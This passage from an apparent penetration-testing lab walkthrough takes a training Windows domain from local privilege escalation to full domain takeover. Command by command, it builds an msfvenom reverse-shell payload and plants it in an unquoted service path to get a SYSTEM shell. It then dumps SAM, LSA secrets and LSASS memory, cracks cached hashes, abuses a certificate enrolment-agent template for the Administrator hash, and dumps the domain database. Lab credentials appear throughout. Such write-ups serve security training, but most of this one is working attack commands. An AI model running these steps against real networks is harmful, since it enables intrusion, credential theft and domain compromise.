    **Why**The check looks for unquoted service paths, weak service permissions and the other standard Windows misconfigurations.
    
    CLIENT-1 (PowerShell)
    
    ```
    get-acl 'C:\Program Files\' | fl
    ```
    
    Copy
    
    Prints the permissions of the program folder in long list form.
    
    **Why**Before writing anything, we confirm whether the folder where the service lives is writable by our user.
    
    CLIENT-1 (PowerShell)
    
    ```
    echo a > 'C:\Program Files\a.txt'
    ```
    
    Copy
    
    Tries to create a file in the program folder.
    
    **Why**The refusal is the answer: the root of the program folder is not writable, so the test file cannot go there.
    
    CLIENT-1 (PowerShell)
    
    ```
    get-acl 'C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe' | fl
    ```
    
    Copy
    
    Prints the permissions of the real service binary.
    
    **Why**The binary is the file the service is meant to run, and its permissions decide whether it can be replaced.
    
    CLIENT-1 (PowerShell)
    
    ```
    echo a > 'C:\Program Files\Common Files\Services\Service Helper\svchosthelper.exe'
    ```
    
    Copy
    
    Tries to overwrite the service binary.
    
    **Why**The refusal proves the binary is protected, so the attack has to come through the path and not through the file.
    
    CLIENT-1 (PowerShell)
    
    ```
    sc.exe stop hosthelpersvc
    ```
    
    Copy
    
    Tries to stop the service.
    
    **Why**The access denied answer shows the account cannot manage the service directly.
    
    CLIENT-1 (PowerShell)
    
    ```
    sc.exe start hosthelpersvc
    ```
    
    Copy
    
    Tries to start the service.
    
    **Why**The same refusal confirms the escalation cannot use the service control interface, only the file system.
    
    CLIENT-1 (PowerShell)
    
    ```
    get-acl 'C:\Program Files\Common Files\Services\' | fl
    ```
    
    Copy
    
    Prints the permissions of the folder that holds the service.
    
    **Why**This is the decisive object: the loader searches this folder before the real path, and its permissions are what matter.
    
    CLIENT-1 (PowerShell)
    
    ```
    icacls.exe 'C:\Program Files\Common Files\Services'
    ```
    
    Copy
    
    Prints the same folder permissions in the short form.
    
    **Why**The short form shows modify rights for the users group, which is the write access the attack needs.
    
    CLIENT-1 (PowerShell)
    
    ```
    echo a > 'C:\Program Files\Common Files\Services\test.txt'
    ```
    
    Copy
    
    Creates a test file in that folder.
    
    **Why**A harmless write is the cheapest proof, and it leaves a file that can be deleted at once.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls 'C:\Program Files\Common Files\Services\test.txt'
    ```
    
    Copy
    
    Lists the test file to confirm it exists.
    
    **Why**The listing with a size and time is the proof that the write landed in the folder the service searches.
    
    **Tip**For an unquoted path, the file name matters more than the folder. Windows tries the path up to each space, so the payload has to be named after the first space-delimited part of the real one.
    
15. 15Drop the payload, reboot, catch SYSTEM_1:05:00_
    
    The payload is a reverse shell built with our own interface as the callback and the port the listener will use. It is named exactly as the loader will look for it, which is the first word of the service path, and it is served from the same web server that delivered the checks.
    
    On the client we remove the test file, download the payload into the service folder under that name, and confirm with a listing. A restart is the trigger: the service starts at boot, the loader finds our file before the real binary, and our process runs as the local system account. The listener catches it and the identity check is the proof.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Prints our interfaces and addresses.
    
    **Why**The payload has to call back to the lab address, so it is confirmed before the build.
    
    Kali
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > Service.exe
    ```
    
    Copy
    
    Builds a 64-bit reverse shell executable that calls back to our interface on port 443.
    
    **Why**The payload is the file the loader will run as system, and the interface name resolves to our lab address.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the build folder over HTTP on port 80.
    
    **Why**The target downloads the payload from us, so no share or open port of its own is involved.
    
    CLIENT-1 (PowerShell)
    
    ```
    cd 'C:\Program Files\Common Files\Services\'
    ```
    
    Copy
    
    Changes into the service folder.
    
    **Why**The payload has to sit in the folder the loader searches first.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the contents of the service folder.
    
    **Why**The listing shows the test file and the folder that holds the real binary, so the new file will not collide.
    
    CLIENT-1 (PowerShell)
    
    ```
    rm .\test.txt
    ```
    
    Copy
    
    Deletes the test file from the folder.
    
    **Why**The proof is no longer needed and the folder is left with only the files the attack needs.
    
    CLIENT-1 (PowerShell)
    
    ```
    wget 10.0.2.16/Service.exe -o Service.exe
    ```
    
    Copy
    
    Downloads the payload into the folder under the name the loader will try first.
    
    **Why**The name is the part of the real path before the first space, which is what the loader appends to the folder.
    
    CLIENT-1 (PowerShell)
    
    ```
    ls
    ```
    
    Copy
    
    Lists the folder to confirm the payload is in place.
    
    **Why**The size check confirms the download completed before the machine restarts.
    
    CLIENT-1 (PowerShell)
    
    ```
    Restart-Computer
    ```
    
    Copy
    
    Restarts the client immediately.
    
    **Why**The service starts at boot, which is the moment the loader walks the path and finds our file.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts the listener that the payload calls back to.
    
    **Why**The callback arrives after the reboot, so the listener has to be ready before the machine finishes starting.
    
    CLIENT-1 (SYSTEM)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the identity of the shell that arrived.
    
    **Why**The answer is the local system account, which is the escalation the unquoted path allowed.
    
    **Tip**An unquoted path only pays off at a start of the service. If you cannot start it, restart the machine, and have the listener ready before it boots.
    
16. 16Harvest the logons of the first client_1:08:28_
    
    The password file is printed for the record, then the first client gets the same treatment the second one had. The same account now answers as an administrator there, so the local hashes and the cached domain logons are both readable.
    
    One cached logon belongs to an account we have not used, and a memory dump of the logon process adds nothing new. The cached hash goes into a file, John cracks it, and the password is a word with digits and a symbol, which falls to the wordlist in a few minutes.
    
    The new account is then checked on every protocol. It is valid everywhere, administrative nowhere, and it opens a desktop on both clients. That is enough to keep it as an identity, and the certificate service is where it becomes more than that.
    
    Kali
    
    ```
    cat pass
    ```
    
    Copy
    
    Prints the password file with all three known passwords.
    
    **Why**The list is the record of what the chain has collected, and it is the input for the next spray.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u vlang -p 'Shar4334!'
    ```
    
    Copy
    
    Tests the account against the first client.
    
    **Why**The administrative answer on this host is what makes the local stores readable.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u vlang -p 'Shar4334!' --sam
    ```
    
    Copy
    
    Dumps the local SAM hashes from the first client.
    
    **Why**Local hashes are reused across machines more often than domain passwords, so they are worth taking from every host.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u vlang -p 'Shar4334!' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets from the first client.
    
    **Why**This is where the cached domain logons of the first client are, and one of them is a new account.
    
    Kali
    
    ```
    gedit client_1_hash
    ```
    
    Copy
    
    Opens a file to hold the cached hash.
    
    **Why**The cracker reads one hash per file in its own format, so the cached line is pasted in on its own.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u vlang -p 'Shar4334!' -M lsassy
    ```
    
    Copy
    
    Runs a module that looks for credentials in the logon process memory.
    
    **Why**It is a quick check for plain text that the registry stores do not keep.
    
    Kali
    
    ```
    netexec smb 10.0.2.7 -u vlang -p 'Shar4334!' -M nanodump
    ```
    
    Copy
    
    Dumps the memory of the logon process to a file and downloads it.
    
    **Why**A dump is kept for offline analysis; here it confirms nothing beyond the cached hash already found.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt client_1_hash
    ```
    
    Copy
    
    Attacks the cached hash with the wordlist.
    
    **Why**The cached format is slow to compute but a human password still falls, and the crack takes minutes.
    
    Kali
    
    ```
    netexec smb ips -u folsen -p 'Phish28*'
    ```
    
    Copy
    
    Tests the cracked account over SMB on the three hosts.
    
    **Why**A valid password everywhere with no administrative answer makes it an identity to keep, not an escalation.
    
    Kali
    
    ```
    netexec winrm ips -u folsen -p 'Phish28*'
    ```
    
    Copy
    
    Tests the account over WinRM.
    
    **Why**WinRM is refused, so no remote shell from this account.
    
    Kali
    
    ```
    netexec wmi ips -u folsen -p 'Phish28*'
    ```
    
    Copy
    
    Tests the account over WMI.
    
    **Why**WMI answers on all three, which is enough to read domain information remotely.
    
    Kali
    
    ```
    netexec rdp ips -u folsen -p 'Phish28*'
    ```
    
    Copy
    
    Tests the account over RDP.
    
    **Why**RDP is open on both clients, which gives an interactive session on either machine.
    
    **Tip**Dump the local secrets of every machine you own, even when the domain already looks close. A cached logon on the last machine is often the account with the permission you need.
    
17. 17Abuse the enrolment agent template_1:15:24_
    
    The last account sees something the earlier ones did not. The template query reports one vulnerable template: it allows a group that contains our account to enrol, and it carries the certificate request agent usage, which is the meaning of this escalation. A certificate with that usage lets its holder ask for a certificate on behalf of any other user.
    
    The first request gets a certificate for our own account from that template. The second request uses it to ask on behalf of the domain Administrator and saves a second certificate with the Administrator name in it. The first authentication attempt fails on clock skew, which is the same problem as earlier in the chain, so the clock is set from the controller and the same command then returns a ticket and the Administrator hash.
    
    The hash is tested against all three hosts, the domain database is dumped from the controller, and a remote shell with the hash confirms the top of the domain.
    
    Kali
    
    ```
    certipy-ad find -u folsen@hack-academy.local -p 'Phish28*' -dc-ip 10.0.2.4 -vulnerable -stdout
    ```
    
    Copy
    
    Asks the certificate authority for vulnerable templates as the last account.
    
    **Why**The template that allows our group to enrol with the request agent usage is the finding, and it is only visible to this account.
    
    Kali
    
    ```
    certipy-ad req -u folsen@hack-academy.local -p 'Phish28*' -dc-ip 10.0.2.4 -template UserAuthentication -ca Hack-Academy-CA
    ```
    
    Copy
    
    Requests a certificate for our own account from the agent template.
    
    **Why**The certificate proves the enrolment right, and its usage lets us act as an agent for other accounts.
    
    Kali
    
    ```
    certipy-ad req -u folsen@hack-academy.local -p 'Phish28*' -dc-ip 10.0.2.4 -template User -ca Hack-Academy-CA -pfx folsen.pfx -on-behalf-of 'hack-academy\Administrator'
    ```
    
    Copy
    
    Uses that certificate to request a certificate on behalf of the domain Administrator.
    
    **Why**The agent usage is what allows the second request, and the resulting certificate carries the Administrator name.
    
    Kali
    
    ```
    certipy-ad auth -dc-ip 10.0.2.4 -pfx administrator.pfx
    ```
    
    Copy
    
    Authenticates with the Administrator certificate to get a ticket.
    
    **Why**A certificate is a credential: the authentication service exchanges it for a ticket and a password hash.
    
    Kali
    
    ```
    rdate -n 10.0.2.4
    ```
    
    Copy
    
    Sets the local clock from the controller.
    
    **Why**The ticket request failed on clock skew, which is the same Kerberos rule as earlier in the chain.
    
    Kali
    
    ```
    certipy-ad auth -dc-ip 10.0.2.4 -pfx administrator.pfx
    ```
    
    Copy
    
    Retries the authentication with the certificate.
    
    **Why**With the clock correct the exchange succeeds and prints the Administrator hash.
    
    Kali
    
    ```
    netexec smb ips -u administrator -H c0ced2de918b4a7c1b9f4efd225dd503
    ```
    
    Copy
    
    Tests the Administrator hash over SMB on all three hosts.
    
    **Why**Pass the hash proves the account works everywhere without the password being cracked.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u administrator -H c0ced2de918b4a7c1b9f4efd225dd503 --ntds
    ```
    
    Copy
    
    Dumps the domain database from the controller with the Administrator hash.
    
    **Why**The replication dump gives every hash in the domain, which is the final evidence of the takeover.
    
    Kali
    
    ```
    impacket-psexec hack-academy.local/administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
    ```
    
    Copy
    
    Opens a remote shell on the controller as Administrator with the hash.
    
    **Why**A shell on the controller as the domain Administrator is the end of the chain.
    
    DC01 (psexec)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the identity of the new shell.
    
    **Why**The answer is the system account on the controller, which confirms full control of the domain.
    
    DC01 (psexec)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints the host name of the shell.
    
    **Why**The name confirms the shell is on the domain controller and not on a member server.
    
    **Tip**A certificate template with the request agent usage is a domain takeover when a group you can join may enrol. Check the templates with every new account, not only the first.
